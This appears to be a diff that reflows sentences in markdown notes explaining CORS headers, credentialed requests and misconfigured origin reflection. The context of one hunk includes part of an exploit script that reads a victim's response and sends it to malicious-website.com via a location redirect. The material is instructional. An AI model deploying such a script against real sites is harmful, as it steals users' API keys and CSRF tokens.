@@ -93,7 +93,9 @@ The Access-Control-Allow-Origin header is included in the response from one webs
 ````
 ### Implementing simple cross-origin resource sharing
 ````
-The cross-origin resource sharing (CORS) specification prescribes header content exchanged between web servers and browsers that restricts origins for web resource requests outside of the origin domain. The CORS specification identifies a collection of protocol headers of which Access-Control-Allow-Origin is the most significant. This header is returned by a server when a website requests a cross-domain resource, with an Origin header added by the browser.
+The cross-origin resource sharing (CORS) specification prescribes header content exchanged between web servers and browsers that restricts origins for web resource requests outside of the origin domain. 
+The CORS specification identifies a collection of protocol headers of which Access-Control-Allow-Origin is the most significant. 
+This header is returned by a server when a website requests a cross-domain resource, with an Origin header added by the browser.
 
 For example, suppose a website with origin normal-website.com causes the following cross-domain request:
 
@@ -109,11 +111,14 @@ Access-Control-Allow-Origin: https://normal-website.com
 
 The browser will allow code running on normal-website.com to access the response because the origins match.
 
-The specification of Access-Control-Allow-Origin allows for multiple origins, or the value null, or the wildcard *. However, no browser supports multiple origins and there are restrictions on the use of the wildcard *.
+The specification of Access-Control-Allow-Origin allows for multiple origins, or the value null, or the wildcard *. 
+However, no browser supports multiple origins and there are restrictions on the use of the wildcard *.
 ````
 ### Handling cross-origin resource requests with credentials
 ````
-The default behavior of cross-origin resource requests is for requests to be passed without credentials like cookies and the Authorization header. However, the cross-domain server can permit reading of the response when credentials are passed to it by setting the CORS Access-Control-Allow-Credentials header to true. Now if the requesting website uses JavaScript to declare that it is sending cookies with the request:
+The default behavior of cross-origin resource requests is for requests to be passed without credentials like cookies and the Authorization header. 
+However, the cross-domain server can permit reading of the response when credentials are passed to it by setting the CORS Access-Control-Allow-Credentials header to true. 
+Now if the requesting website uses JavaScript to declare that it is sending cookies with the request:
 
 GET /data HTTP/1.1
 Host: robust-website.com
@@ -128,7 +133,8 @@ HTTP/1.1 200 OK
 Access-Control-Allow-Origin: https://normal-website.com
 Access-Control-Allow-Credentials: true
 
-Then the browser will permit the requesting website to read the response, because the Access-Control-Allow-Credentials response header is set to true. Otherwise, the browser will not allow access to the response.
+Then the browser will permit the requesting website to read the response, because the Access-Control-Allow-Credentials response header is set to true. 
+Otherwise, the browser will not allow access to the response.
 ````
 ### Vulnerabilities arising from CORS configuration issues
 ````
@@ -155,7 +161,8 @@ Access-Control-Allow-Credentials: true
 
 These headers state that access is allowed from the requesting domain (malicious-website.com) and that the cross-domain requests can include cookies (Access-Control-Allow-Credentials: true) and so will be processed in-session.
 
-Because the application reflects arbitrary origins in the Access-Control-Allow-Origin header, this means that absolutely any domain can access resources from the vulnerable domain. If the response contains any sensitive information such as an API key or CSRF token, you could retrieve this by placing the following script on your website:
+Because the application reflects arbitrary origins in the Access-Control-Allow-Origin header, this means that absolutely any domain can access resources from the vulnerable domain. 
+If the response contains any sensitive information such as an API key or CSRF token, you could retrieve this by placing the following script on your website:
 
 var req = new XMLHttpRequest();
 req.onload = reqListener;
@@ -170,7 +177,8 @@ location='//malicious-website.com/log?key='+this.responseText;
 ### Errors parsing Origin headers
 ````
 Some applications that support access from multiple origins do so by using a whitelist of allowed origins. 
-When a CORS request is received, the supplied origin is compared to the whitelist. If the origin appears on the whitelist then it is reflected in the Access-Control-Allow-Origin header so that access is granted. 
+When a CORS request is received, the supplied origin is compared to the whitelist. 
+If the origin appears on the whitelist then it is reflected in the Access-Control-Allow-Origin header so that access is granted. 
 For example, the application receives a normal request like:
 
 GET /data HTTP/1.1
